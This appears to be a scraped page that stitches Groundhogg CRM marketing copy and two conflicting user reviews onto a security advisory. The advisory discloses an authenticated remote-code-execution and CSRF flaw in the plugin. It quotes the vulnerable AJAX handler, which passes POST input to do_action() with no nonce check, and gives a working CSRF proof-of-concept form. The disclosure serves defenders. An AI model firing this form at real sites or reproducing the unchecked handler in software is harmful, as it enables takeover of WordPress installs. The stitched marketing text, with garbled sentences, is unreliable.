Groundhogg CRM & Marketing Automation for WordPress can help you dramatically improve how you acquire leads and make more sales!

Our award winning WordPress CRM is the very best alternative to [Infusionsoft](https://groundhogg.io/comparison/groundhogg-vs-infusionsoft/), [ActiveCampaign](https://groundhogg.io/comparison/groundhogg-vs-activecampaign/), [Convertkit](https://www.groundhogg.io/comparison/convertkit/), [HubSpot](https://groundhogg.io/comparison/groundhogg-vs-hubspot/), [MailChimp](https://www.groundhogg.io/comparison/mailchimp/) and [other SaaS platforms](https://www.groundhogg.io/comparison/).

### 🪓 Ax the “Success Tax”

Other SaaS (Software as a Service) CRM platforms will charge you more as your list grows.

**But not us!**

When using the Groundhogg CRM & Marketing Automation suite free or with any of our paid plans, *we’ll never charge you more*!

### 🚫 There are *no limits* on:

* Number of contacts

### 💽 You own your data!

The reality of SaaS CRMs is that you pay, and pay, and pay, and you invest all this money into a system to help your business thrive, but it can be taken away at a moments notice.

Putting your data in a SaaS CRM is like renting an apartment, but with less protection and stingier landlords. You can get evicted at any time, for any reason. There is no recourse.

This leaves your business exposed. What would happen to your business if your CRM was turned off?

With Groundhogg you actually [own your data](https://www.groundhogg.io/learn/email-and-self-hosting-is-now-more-critical-than-ever/)! No one expect you can make impactful changes.

Is being sold as a no cost CRM but it’s nothing but a money making and nagging plugin that offer nothing to users. Imagine you are the small guy just getting started and now your system has been infected with a huge resource robbing plugin that is all about getting you to spend a bunch of money each month, worse it tries to sell you more bloat from other people and at the same high rates any other CRM charges, sorry not buying

As a nonprofit founder, I know just enough to be dangerous in the digital marketing space. I have lost so much money in previous years because I did not know what I was doing. Gregg and Adrian have been amazingly supportive of me and my digital consultants. They really “think” before sending an email response and have caught some potential problems in my site. I am truly thankful for how they helped me switch to Groundhogg and Mailhawk.I am looking forward to implementing through the new platforms, and getting the most out of the many cost effective options offered through Groundhogg and Mailhawk.
I feel confident moving forward with them.

Goundhogg is fully integrated into Wordpress rather than a stand-alone CRM, making it easy for designers, developers and reular users to implement and use. Using it with pro features and MailHwak makes for a really simple combo that just works. Love it.

# Our Proactive Monitoring Caught an Authenticated Remote Code Execution (RCE) Vulnerability Being Introduced in to Groundhogg

Occasionally our [proactive monitoring of changes made to plugins in the Plugin Directory to try to catch serious vulnerabilities](https://www.pluginvulnerabilities.com/proactive-monitoring-for-vulnerabilities-in-new-versions-of-wordpress-plugins/) catches an easy to confirm vulnerability and that was the case with an authenticated remote code execution (RCE) vulnerability being introduced in to the plugin [Groundhogg](https://wordpress.org/plugins/groundhogg/), which is also exploitable through cross-site request forgery (CSRF).

Since our [Plugin Security Checker](https://www.pluginvulnerabilities.com/plugin-security-checker/) utilizes the same checks, it will alert you if plugins you use possibly contain the same type vulnerable code (and other types of vulnerable code). From there if you are a paying customer of our service [you can suggest/vote for it to receive a security review](https://www.pluginvulnerabilities.com/wordpress-plugin-security-reviews/) that will check over that or [you can order the same type of review separately](https://www.pluginvulnerabilities.com/wordpress-plugin-security-review-service/).

The Plugin Security Checker flags a number of other possible security vulnerabilities in the plugin, so if you use this plugin it would be a good idea to have it further reviewed.

The impacted code isn’t too hard to understand, as it passes the value of POST input “bulk\_action” to the function [do\_action](https://developer.wordpress.org/reference/functions/do_action/)(), which executes “functions hooked on a specific action hook”:

| ``` 35 36 37 38 39  ``` | ``` public function ajax_listener() { 	$bulk_action = $_POST[ 'bulk_action' ]; 	do_action( $bulk_action ); } ``` |
| --- | --- |

public function ajax\_listener()
{
$bulk\_action = $\_POST[ 'bulk\_action' ];
do\_action( $bulk\_action );
}

Based on the name of the function it isn’t surprising that it is accessible through WordPress’ AJAX functionality:

| ``` 29  ``` | ``` add_action( 'wp_ajax_bulk_action_listener', [ $this, 'ajax_listener' ] ); ``` |
| --- | --- |

add\_action( 'wp\_ajax\_bulk\_action\_listener', [ $this, 'ajax\_listener' ] );

In this case it is accessible to anyone logged in to WordPress. Since the code in that function doesn’t check for a valid nonce, in addition to anyone logged in to WordPress being able to exploit it, an attacker could cause someone that is logged in to exploit this without intending to, as well.

Due to the moderators of the WordPress Support Forum’s [continued](https://www.pluginvulnerabilities.com/2018/09/27/wordpress-team-didnt-notify-developer-of-plugin-with-700000-active-installations-about-vulnerability-they-knew-about/) [inappropriate](https://www.pluginvulnerabilities.com/2018/09/25/wordpress-support-forum-moderators-engaged-in-cover-up-of-security-issues-in-wordpress-plugins/)[behavior](https://www.pluginvulnerabilities.com/2018/09/25/wordpress-support-forum-moderators-stop-people-from-getting-help-so-they-can-promote-favored-security-companies/) we are [full disclosing vulnerabilities in protest until WordPress gets that situation cleaned up](https://www.pluginvulnerabilities.com/2018/09/25/our-new-disclosure-policy-in-response-to-the-continued-inappropriate-behavior-of-the-wordpress-support-forum-moderators/), so we are releasing this post and then only trying to notify the developer through the WordPress Support Forum. You can notify the developer of this issue on the forum as well. Hopefully the moderators will finally see the light and clean up their act soon, so these full disclosures will no longer be needed (we hope they end soon). You would think they would have already done that since multiple [previously full disclosed vulnerabilities](https://www.pluginvulnerabilities.com/2018/11/30/hackers-have-been-probing-for-usage-of-the-kiwi-social-share-wordpress-plugin-for-a-couple-of-weeks/)were [quickly on hackers’ radar](https://www.pluginvulnerabilities.com/2019/03/26/webarx-hides-that-their-firewall-failed-to-provide-same-protection-simply-updating-wordpress-plugin-would-have/), but it appears those moderators have such disdain for the rest of the WordPress community that their continued ability to act inappropriate is more important that what is best for the rest of the community.

## Proof of Concept

The following proof of concept will cause the WordPress action/function do\_feed\_rss to run, when logged in to WordPress.

Make sure to replace “[path to WordPress]” with the location of WordPress.

```
<html>
<body>
<form action="http://[path to WordPress]/wp-admin/admin-ajax.php?action=bulk_action_listener" method="POST">
<input type="hidden" name="bulk_action" value="do_feed_rss" />
<input type="submit" value="Submit" />
</form>
</body>
</html>

## Is It Fixed?

If you are reading this post down the road the best way to find out if this vulnerability or other WordPress plugin vulnerabilities in plugins you use have been fixed is to sign up for [our service](https://www.pluginvulnerabilities.com/product/subscription/), since what we uniquely do when it comes to that type of data is to test to see if vulnerabilities have really been fixed. Relying on the developer’s information, can lead you astray, as we often find that they believe they have fixed vulnerabilities, but have failed to do that.
